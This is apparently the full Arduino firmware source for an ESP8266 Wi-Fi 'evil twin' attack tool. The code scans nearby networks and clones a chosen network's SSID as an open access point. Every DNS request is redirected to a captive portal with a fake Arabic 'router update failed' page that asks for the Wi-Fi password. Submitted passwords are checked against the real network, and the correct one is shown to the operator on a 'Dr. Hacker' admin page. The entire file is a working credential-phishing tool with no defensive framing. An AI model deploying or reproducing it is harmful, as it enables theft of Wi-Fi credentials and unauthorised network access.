#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>

typedef struct {
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
} _Network;

const byte DNS_PORT = 53;
DNSServer dnsServer;
ESP8266WebServer webServer(80);

_Network _networks[16];
_Network _selectedNetwork;

void clearArray() {
  for (int i = 0; i < 16; i++) {
    _Network network;
    _networks[i] = network;
  }
}

String _correct = "";
String _tryPassword = "";


#define SUBTITLE "مشكلة في الاتصال"
#define TITLE "<warning style='text-shadow: 1px 1px black;color:yellow;font-size:7vw;'>&#9888;</warning> فشل في تحديث الجهاز"
#define BODY ".تعذر تحديث نظام الراوتر تلقائياً <br><br> .للرجوع للإصدار السابق والتحديث يدوياً، يرجى إدخال كلمة المرور" 

String header(String t) {
  String a = String(_selectedNetwork.ssid);
  String CSS =
      "article { background: #f2f2f2; padding: 1.3em; }"
      "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
      "div { padding: 0.5em; }"
      "h1 { margin: 0.5em 0 0 0; padding: 0.5em; font-size:7vw;}"
      "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border: 1px solid #555555; border-radius: 10px; }"
      "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
      "nav { background: #0066ff; color: #fff; display: block; font-size: 1.3em; padding: 1em; }"
      "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; }";
  String h =
      "<!DOCTYPE html><html>"
      "<head><title><center>" + a + " :: " + t + "</center></title>"
      "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
      "<style>" + CSS + "</style>"
      "<meta charset=\"UTF-8\"></head>"
      "<body><nav><b>" + a + "</b> " + SUBTITLE + "</nav><div><h1>" + t + "</h1></div><div>";
  return h;
}

String footer() {
  return "</div><div class=q><a>&#169; All rights reserved.</a></div></body></html>";
}

String indexPage() {
  return header(TITLE) + "<div>" + BODY +
         "</div><div><form action='/' method=post><label>: Wifiكلمة المرور الخاصة بشبكةالـ </label>"
         "<input type=password id='password' name='password' minlength='8'>"
         "<input type=submit value='Continue'></form>" + footer();
}

String bytesToStr(const uint8_t* b, uint32_t size) {
  String str;
  const char ZERO = '0';
  const char DOUBLEPOINT = ':';
  for (uint32_t i = 0; i < size; i++) {
    if (b[i] < 0x10) str += ZERO;
    str += String(b[i], HEX);
    if (i < size - 1) str += DOUBLEPOINT;
  }
  return str;
}

void performScan() {
  int n = WiFi.scanNetworks();
  clearArray();

  if (n >= 0) {
    for (int i = 0; i < n && i < 16; ++i) {
      _Network network;
      network.ssid = WiFi.SSID(i);
      for (int j = 0; j < 6; j++) {
        network.bssid[j] = WiFi.BSSID(i)[j];
      }
      network.ch = WiFi.channel(i);
      _networks[i] = network;
    }
  }
}


bool hotspot_active = false;


String _tempHTML =
  "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'>"
  "<style> .content {max-width: 500px;margin: auto;}table, th, td {border: 1px solid black;border-collapse: collapse;padding-left:10px;padding-right:10px;}</style>"
  "</head><body><div class='content'>"
  "<div>"
  "<form style='display:inline-block; padding-left:8px;' method='post' action='/?hotspot={hotspot}'>"
  "<button style='display:inline-block; padding:18px 26px; '{disabled}>{hotspot_button}</button></form>"
  "</div></br>"
  "<table><tr><th>SSID</th><th>Channel</th><th>Select</th></tr>";


void handleResult() {
  if (WiFi.status() != WL_CONNECTED) {
    webServer.send(
      200, "text/html",
      "<html><head>"
      "<script>setTimeout(function(){window.location.href='/'}, 4000);</script>"
      "<meta name='viewport' content='initial-scale=1.0, width=device-width'>"
      "</head><body><center>"
      "<h2><wrong style='text-shadow: 1px 1px black;color:red;font-size:60px;'>&#8855;</wrong>"
      "<br>Wrong Password</h2><p>Please, try again.</p>"
      "</center></body></html>"
    );
    Serial.println("Wrong password tried!");
  } else {
    _correct = "Successfully got the password: \n"  + _tryPassword;

    hotspot_active = false;
    dnsServer.stop();
    WiFi.softAPdisconnect(true);

    WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
    WiFi.softAP("Dr. Hacker", "0123456789");
    dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));

    Serial.println("Good password was entered!");
    Serial.println(_correct);
  }
}

void handleIndex() {
  // Select network
  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap")) {
        _selectedNetwork = _networks[i];
      }
    }
  }

  // Toggle hotspot (evil twin SSID)
  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start") {
      hotspot_active = true;

      dnsServer.stop();
      WiFi.softAPdisconnect(true);

      WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
      WiFi.softAP(_selectedNetwork.ssid.c_str()); // open AP, same SSID
      dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));

    } else if (webServer.arg("hotspot") == "stop") {
      hotspot_active = false;

      dnsServer.stop();
      WiFi.softAPdisconnect(true);

      WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
      WiFi.softAP("Dr. Hacker", "0123456789");
      dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));
    }
    return;
  }

  // Admin list page (only when hotspot is OFF)
  if (!hotspot_active) {
    String html = _tempHTML;

    for (int i = 0; i < 16; ++i) {
      if (_networks[i].ssid == "") break;

      html += "<tr><td>" + _networks[i].ssid + "</td><td>" +
              String(_networks[i].ch) +
              "</td><td><form method='post' action='/?ap=" +
              bytesToStr(_networks[i].bssid, 6) + "'>";

      if (bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6)) {
        html += "<button style='background-color:#90ee90;'>Selected</button>";
      } else {
        html += "<button>Select</button>";
      }
      html += "</form></td></tr>";
    }

    if (hotspot_active) {
      html.replace("{hotspot_button}", "Stop EvilTwin");
      html.replace("{hotspot}", "stop");
    } else {
      html.replace("{hotspot_button}", "Start EvilTwin");
      html.replace("{hotspot}", "start");
    }

    if (_selectedNetwork.ssid == "") {
      html.replace("{disabled}", " disabled");
    } else {
      html.replace("{disabled}", "");
    }

    html += "</table>";

    if (_correct != "") {
      html += "</br><h3>" + _correct + "</h3>";
    }

    html += "</div></body></html>";
    webServer.send(200, "text/html", html);

  } else {
    // Captive portal password collection page
    if (webServer.hasArg("password")) {
      _tryPassword = webServer.arg("password");

      delay(1000);
      WiFi.disconnect();

      // Attempt to connect to the real AP to "verify" password
      WiFi.begin(
        _selectedNetwork.ssid.c_str(),
        webServer.arg("password").c_str(),
        _selectedNetwork.ch,
        _selectedNetwork.bssid
      );

      webServer.send(
        200, "text/html",
        "<!DOCTYPE html><html><head>"
        "<script>setTimeout(function(){window.location.href='/result';}, 15000);</script>"
        "</head><body><center>"
        "<h2 style='font-size:7vw'>Verifying integrity, please wait...<br>"
        "<progress value='10' max='100'>10%</progress></h2>"
        "</center></body></html>"
      );
    } else {
      webServer.send(200, "text/html", indexPage());
    }
  }
}

void handleAdmin() {
  // Keep /admin same as /
  handleIndex();
}

// =====================
// Setup / Loop
// =====================
unsigned long now = 0;
unsigned long wifinow = 0;

void setup() {
  Serial.begin(115200);

  WiFi.mode(WIFI_AP_STA);

  // Default AP for operator/admin page
  WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
  WiFi.softAP("Dr. Hacker", "0123456789");

  // Captive portal DNS
  dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));

  // Web routes
  webServer.on("/", handleIndex);
  webServer.on("/result", handleResult);
  webServer.on("/admin", handleAdmin);
  webServer.onNotFound(handleIndex);
  webServer.begin();

  performScan();
  now = millis();
  wifinow = millis();
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();

  // rescan every 15s
  if (millis() - now >= 15000) {
    performScan();
    now = millis();
  }

  // debug WiFi status every 2s
  if (millis() - wifinow >= 2000) {
    Serial.println(WiFi.status() == WL_CONNECTED ? "GOOD" : "BAD");
    wifinow = millis();
  }
}
